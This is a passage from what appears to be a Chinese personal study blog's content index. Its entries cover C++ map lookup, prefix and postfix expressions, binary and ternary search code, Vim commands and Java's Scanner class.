umap.begin(); iter != umap.end(); ++iter) &#123;<br>        <span class="hljs-comment">//判断当前的键值对是否就是要找的</span><br>        <span class="hljs-keyword">if</span> (!iter-&gt;first.compare(<span class="hljs-string">&quot;Java教程&quot;</span>)) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>https:<span class="hljs-comment">//lichengloong.com/2</span><br></code></pre></div></td></tr></table></figure><p>前 2 种方法基本能满足多数场景的需要，建议首选 at() 成员方法！</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据结构-前、中、后缀表达式</title>
    <link href="/2021/04/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%89%8D%E3%80%81%E4%B8%AD%E3%80%81%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2021/04/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%89%8D%E3%80%81%E4%B8%AD%E3%80%81%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>算式表达式在计算机中的前、中、后缀表示方式及其计算方式。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-前缀表达式"><a href="#1-前缀表达式" class="headerlink" title="1.前缀表达式"></a>1.前缀表达式</h3><p>运算符位于操作数之前。<br><strong>例如：</strong>-×+3456</p><h3 id="2-中缀表达式"><a href="#2-中缀表达式" class="headerlink" title="2.中缀表达式"></a>2.中缀表达式</h3><p>运算符处于操作数的中间。中缀表达式是人们常用的算术表示方法。计算机计算中缀表达式是复杂的，所以一般需要将中缀表达式转换成前缀或者后缀表达式。<br><strong>例如：</strong>(3+4)×5-6</p><h3 id="3-后缀表达式"><a href="#3-后缀表达式" class="headerlink" title="3.后缀表达式"></a>3.后缀表达式</h3><p>运算符位于操作数之后。<br><strong>例如：</strong>34+5×6-</p><h3 id="4-计算机计算前缀表达式的方法"><a href="#4-计算机计算前缀表达式的方法" class="headerlink" title="4.计算机计算前缀表达式的方法"></a>4.计算机计算前缀表达式的方法</h3><p><strong><span style="color:red">从右至左</span></strong> 扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算，并将结果入栈；重复上述过程直到表达式最左端，最后运算得出的值即为表达式的结果。<br>例如：前缀表达式“ - × + 3 4 5 6 ”：</p><blockquote><p>1.从右至左扫描，将6、5、4、3压入堆栈；<br>2.遇到+运算符，因此弹出3和4（3为栈顶元素，4为次顶元素，注意与后缀表达式做比较），计算出3+4的值，得到结果7，再将7入栈；<br>3.接下来是×运算符，因此弹出7和5，计算出7×5=35，将35入栈；<br>4.最后是-运算符，计算出35-6的值，即29，由此得出最终结果。</p></blockquote><h3 id="5-计算机计算后缀表达式的方法"><a href="#5-计算机计算后缀表达式的方法" class="headerlink" title="5.计算机计算后缀表达式的方法"></a>5.计算机计算后缀表达式的方法</h3><p>与前缀表达式类似，只是顺序是从左至右。<br>从左至右扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算，并将结果入栈；重复上述过程直到表达式最右端，最后运算得出的值即为表达式的结果。<br>例如：后缀表达式“ 3 4 + 5 × 6 - ”：</p><blockquote><p>1.从左至右扫描，将3和4压入堆栈；<br>2.遇到+运算符，因此弹出4和3（4为栈顶元素，3为次顶元素，注意与前缀表达式做比较），计算出3+4的值，得到结果7，再将7入栈；<br>3.将5入栈；<br>4.接下来是×运算符，因此弹出5和7，计算出7×5=35，将35入栈；<br>5.将6入栈；<br>6.最后是-运算符，计算出35-6的值，即29，由此得出最终结果。</p></blockquote><h3 id="6-中缀表达式-转换为-前缀表达式"><a href="#6-中缀表达式-转换为-前缀表达式" class="headerlink" title="6. 中缀表达式 转换为 前缀表达式"></a>6. <span style="color:green">中缀表达式</span> 转换为 <span style="color:green">前缀表达式</span></h3><blockquote><p>1.初始化两个栈：运算符栈S1和储存中间结果的栈S2；<br>2.从右至左扫描中缀表达式；<br>3.遇到操作数时，将其压入S2；</p></blockquote><blockquote><p>4.遇到运算符时，比较其与S1栈顶运算符的优先级：</p><ul><li>如果S1为空，或栈顶运算符为右括号“)”，则直接将此运算符入栈；</li><li>否则，若优先级比栈顶运算符的较高或相等，也将运算符压入S1；</li><li>否则，将S1栈顶的运算符弹出并压入到S2中，再次转到4-1与S1中新的栈顶运算符相比较；</li></ul></blockquote><blockquote><p>5.遇到括号时：</p><ul><li>如果是右括号“)”，则直接压入S1；</li><li>如果是左括号“(”，则依次弹出S1栈顶的运算符，并压入S2，直到遇到右括号为止，此时将这一对括号丢弃；</li></ul></blockquote><blockquote><p>6.重复步骤(2)至(5)，直到表达式的最左边；<br>7.将S1中剩余的运算符依次弹出并压入S2；<br>8.依次弹出S2中的元素并输出，结果即为中缀表达式对应的前缀表达式。</p></blockquote><h3 id="7-中缀表达式-转换为-后缀表达式"><a href="#7-中缀表达式-转换为-后缀表达式" class="headerlink" title="7.中缀表达式 转换为 后缀表达式"></a>7.<span style="color:green">中缀表达式</span> 转换为 <span style="color:green">后缀表达式</span></h3><blockquote><p>1.初始化两个栈：运算符栈S1和储存中间结果的栈S2；<br>2.从左至右扫描中缀表达式；<br>3.遇到操作数时，将其压入S2；</p></blockquote><blockquote><p>4.遇到运算符时，比较其与S1栈顶运算符的优先级：</p><ul><li>如果S1为空，或栈顶运算符为左括号“(”，则直接将此运算符入栈；</li><li>否则，若优先级比栈顶运算符的高，也将运算符压入S1（注意转换为前缀表达式时是优先级较高或相同，而这里则不包括相同的情况）；</li><li>否则，将S1栈顶的运算符弹出并压入到S2中，再次转到4-1与S1中新的栈顶运算符相比较；</li></ul></blockquote><blockquote><p>5.遇到括号时：</p><ul><li>如果是左括号“(”，则直接压入S1；</li><li>如果是右括号“)”，则依次弹出S1栈顶的运算符，并压入S2，直到遇到左括号为止，此时将这一对括号丢弃；</li></ul></blockquote><blockquote><p>6.重复步骤(2)至(5)，直到表达式的最右边；<br>7.将S1中剩余的运算符依次弹出并压入S2；<br>8.依次弹出S2中的元素并输出，结果的逆序即为中缀表达式对应的后缀表达式（转换为前缀表达式时不用逆序）。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-二分/三分查找</title>
    <link href="/2021/04/12/ACM/ACM-%E4%BA%8C%E5%88%86&amp;%E4%B8%89%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    <url>/2021/04/12/ACM/ACM-%E4%BA%8C%E5%88%86&amp;%E4%B8%89%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<p>实现二分和三分查找。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//#define _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-comment">//#include&lt;bits/stdc++.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;numeric&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[],<span class="hljs-keyword">int</span> len,<span class="hljs-keyword">int</span> m)</span>                 <span class="hljs-comment">//len为数组的长度  m为被查找的数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = len - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt;= right)<br>    &#123;<br>        <span class="hljs-keyword">int</span> k=left+(right-left)/<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (m == a[k])                  <span class="hljs-comment">//即 m就为中间值</span><br>            <span class="hljs-keyword">return</span> k;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (m &gt; a[k])              <span class="hljs-comment">//即m在中间到最后这一段里面</span><br>            left = k + <span class="hljs-number">1</span>;               <span class="hljs-comment">//所以就让left从中间的下一个开始 重复二分查找</span><br>        <span class="hljs-keyword">else</span><br>            right = k - <span class="hljs-number">1</span>;              <span class="hljs-comment">//即 m在开始到中间这一段里面</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;                          <span class="hljs-comment">//如没有上述三种情况 则就是没有找到 即没有m元素</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> t[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入总个数和要查找的数：&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入数：&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;++i) <span class="hljs-built_in">cin</span>&gt;&gt;t[i];<br>sort(t,t+n);<br><span class="hljs-keyword">int</span> f=find(t,n,m);<br><span class="hljs-keyword">if</span>(f==<span class="hljs-number">-1</span>) <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;NO!&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;OK!&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="三分查找"><a href="#三分查找" class="headerlink" title="三分查找"></a>三分查找</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//#define _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-comment">//#include&lt;bits/stdc++.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;numeric&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find3</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a,<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> r,<span class="hljs-keyword">int</span> key)</span></span>&#123;<br><span class="hljs-keyword">int</span> flag;<br><span class="hljs-keyword">if</span>(l&gt;r) flag=<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">int</span> mid1=(r-l)/<span class="hljs-number">3</span>+l; <span class="hljs-comment">//自行带入数据比较好理解</span><br><span class="hljs-keyword">int</span> mid2=r-(r-l)/<span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span>(key==a[mid1]) flag=mid1;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key==a[mid2]) flag=mid2;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&lt;a[mid1]) flag=find3(a,l,mid1<span class="hljs-number">-1</span>,key);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&gt;a[mid2]) flag=find3(a,mid2+<span class="hljs-number">1</span>,r,key);<br><span class="hljs-keyword">else</span> flag=find3(a,mid1+<span class="hljs-number">1</span>,mid2<span class="hljs-number">-1</span>,key);<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> t[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入总个数和要查找的数：&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;请输入数：&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;++i) <span class="hljs-built_in">cin</span>&gt;&gt;t[i];<br>sort(t+<span class="hljs-number">1</span>,t+n+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">int</span> f=find3(t,<span class="hljs-number">1</span>,n,m);<br><span class="hljs-keyword">if</span>(f==<span class="hljs-number">-1</span>) <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;NO!&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;OK!&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux学习-Vim的使用操作</title>
    <link href="/2021/04/12/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-Vim%E7%9A%84%E4%BD%BF%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/04/12/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-Vim%E7%9A%84%E4%BD%BF%E7%94%A8%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>Vim 是从 vi 发展出来的一个文本编辑器。其代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。和 Emacs 并列成为类 Unix 系统用户最喜欢的编辑器。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="1-Vi基础"><a href="#1-Vi基础" class="headerlink" title="1.Vi基础"></a>1.Vi基础</h3><p>基本上 vi 共分为三种模式，分别是“一般指令模式”、“编辑模式”与“命令行命令模式”。 这三种模式的作用分别是：</p><ul><li><p>一般指令模式 （command mode）</p><blockquote><p>以 vi 打开一个文件就直接进入一般指令模式了（这是默认的模式，也简称为一般模式）。在这个模式中， 你可以使用“上下左右”按键来移动光标，你可以使用“删除字符”或“删除整列”来处理文件内容， 也可以使用“复制、贴上”来处理你的文件数据。</p></blockquote></li><li><p>编辑模式 （insert mode）</p><blockquote><p>在一般指令模式中可以进行删除、复制、贴上等等的动作，但是却无法编辑文件内容的！ 要等到你按下“i, I, o, O, a, A, r, R”等任何一个字母之后才会进入编辑模式。注意了！通常在 Linux 中，按下这些按键时，在画面的左下方会出现“ INSERT 或 REPLACE ”的字样，此时才可以进行编辑。而如果要回到一般指令模式时， 则必须要按下“Esc”这个按键即可退出编辑模式。</p></blockquote></li><li><p>命令行命令模式 （command-line mode）</p><blockquote><p>在一般模式当中，输入“ : / ? ”三个中的任何一个按钮，就可以将光标移动到最下面那一列。在这个模式当中， 可以提供你“搜寻数据”的动作，而读取、存盘、大量取代字符、离开 vi 、显示行号等等的动作则是在此模式中达成的！</p></blockquote></li></ul><p><img src="https://img-blog.csdnimg.cn/20210412092335171.gif"></p><p>可以发现一般指令模式可与编辑模式及命令行界面切换， 但编辑模式与命令行界面之间不可互相切换。<br><strong>注意：</strong>英文版的 vi/vim 说明中，一般模式其实是“ command mode ”的意思！中文直译会变成指令模式啊！ 之所以称为指令模式，主因是我们可以在一般模式下面按下很多特殊的指令功能！例如删除、复制、区块选择等等！只是这个模式很容易跟命令行界面 （command-line） 混淆～不过真的很容易误解！所以，在此博客中这一模式改称为“一般指令模式”！</p><h3 id="2-常见操作"><a href="#2-常见操作" class="headerlink" title="2.常见操作"></a>2.常见操作</h3><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">dd</td><td align="center">删除（剪切）光标所在整行</td></tr><tr><td align="center">ndd</td><td align="center">删除（剪切）从光标处开始的5行</td></tr><tr><td align="center">yy</td><td align="center">复制光标所在整行</td></tr><tr><td align="center">nyy</td><td align="center">复制从光标处开始的5行</td></tr><tr><td align="center">n</td><td align="center">显示搜索命令定位到的下一个字符串</td></tr><tr><td align="center">N</td><td align="center">显示搜索命令定位到的上一个字符串</td></tr><tr><td align="center">u</td><td align="center">撤销上一步的操作</td></tr><tr><td align="center">p</td><td align="center">将之前删除（dd）或复制（yy）过的数据粘贴到光标后面</td></tr><tr><td align="center">:w</td><td align="center">保存</td></tr><tr><td align="center">:q</td><td align="center">退出</td></tr><tr><td align="center">:q!</td><td align="center">强制退出（放弃对文档的修改内容）</td></tr><tr><td align="center">:wq!</td><td align="center">强制保存退出</td></tr><tr><td align="center">:set nu</td><td align="center">显示行号</td></tr><tr><td align="center">:set nonu</td><td align="center">不显示行号</td></tr><tr><td align="center">:命令</td><td align="center">执行该命令</td></tr><tr><td align="center">:整数</td><td align="center">跳转到该行</td></tr><tr><td align="center">: s/one/two</td><td align="center">将当前光标所在行的第一个one替换成two</td></tr><tr><td align="center">:s/one/two/g</td><td align="center">将当前光标所在行的所有one替换成two</td></tr><tr><td align="center">:%s/one/two/g</td><td align="center">将全文中的所有one替换成two</td></tr><tr><td align="center">?字符串</td><td align="center">在文本中从下至上搜索该字符串</td></tr><tr><td align="center">/字符串</td><td align="center">在文本中从上至下搜索该字符串</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Linux学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>博客声明</title>
    <link href="/2021/04/12/%E5%8D%9A%E5%AE%A2%E5%A3%B0%E6%98%8E/"/>
    <url>/2021/04/12/%E5%8D%9A%E5%AE%A2%E5%A3%B0%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<h3 id="本博客网站仅为写者学习记录整理所用，部分博客内容来源于网络。"><a href="#本博客网站仅为写者学习记录整理所用，部分博客内容来源于网络。" class="headerlink" title="本博客网站仅为写者学习记录整理所用，部分博客内容来源于网络。"></a>本博客网站仅为写者学习记录整理所用，部分博客内容来源于网络。</h3>]]></content>
    
    
    <categories>
      
      <category>博客声明</category>
      
    </categories>
    
    
    <tags>
      
      <tag>声明</tag>
      
      <tag>提示</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(五)-Scanner 类</title>
    <link href="/2021/04/11/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%BA%94)-Scanner%20%E7%B1%BB/"/>
    <url>/2021/04/11/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E4%BA%94)-Scanner%20%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(五)，与输入有关的Scanner 类。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>java.util.Scanner 是 Java5 的新特征，我们可以通过 Scanner 类来获取用户的输入。</p><blockquote><p>导包：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner; <br></code></pre></div></td></tr></table></figure><blockquote><p>创建Scanner类对象</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Scanner s = <span class="hljs-keyword">new</span> Scanner(System.in);<br></code></pre></div></td></tr></table></figure><p>通过 Scanner 类的 next() 与 nextLine() 方法获取输入的字符串，在读取前我们一般需要 使用 hasNext 与 hasNextLine 判断是否还有输入的数据。</p><h3 id="1-使用next输入"><a href="#1-使用next输入" class="headerlink" title="1.使用next输入"></a>1.使用next输入</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">        Scanner cin = <span class="hljs-keyword">new</span> Scanner(System.in);<br>        <span class="hljs-comment">// next方式接收字符串</span><br>        System.out.println(<span class="hljs-string">&quot;next方式接收：&quot;</span>);<br>        <span class="hljs-comment">// 判断是否还有输入</span><br>        <span class="hljs-keyword">if</span> (cin.hasNext()) &#123;<br>            String str1 = cin.next();<br>            System.out.println(<span class="hljs-string">&quot;输入的数据为：&quot;</span> + str1);<br>        &#125;<br>        cin.close();<br><span class="hljs-comment">//输入</span><br>lichengloong com<br><span class="hljs-comment">//输出</span><br>lichengloong <span class="hljs-comment">//没有后面的com</span><br></code></pre></div></td></tr></table></figure><h3 id="2-使用-nextLine-方法"><a href="#2-使用-nextLine-方法" class="headerlink" title="2.使用 nextLine 方法"></a>2.使用 nextLine 方法</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">        Scanner cin = <span class="hljs-keyword">new</span> Scanner(System.in);<br>        System.out.println(<span class="hljs-string">&quot;nextLine方式接收：&quot;</span>);<br>        <span class="hljs-comment">// 判断是否还有输入</span><br>        <span class="hljs-keyword">if</span> (cin.hasNextLine()) &#123;<br>            String str2 = cin.nextLine();<br>            System.out.println(<span class="hljs-string">&quot;输入的数据为：&quot;</span> + str2);<br>        &#125;<br>        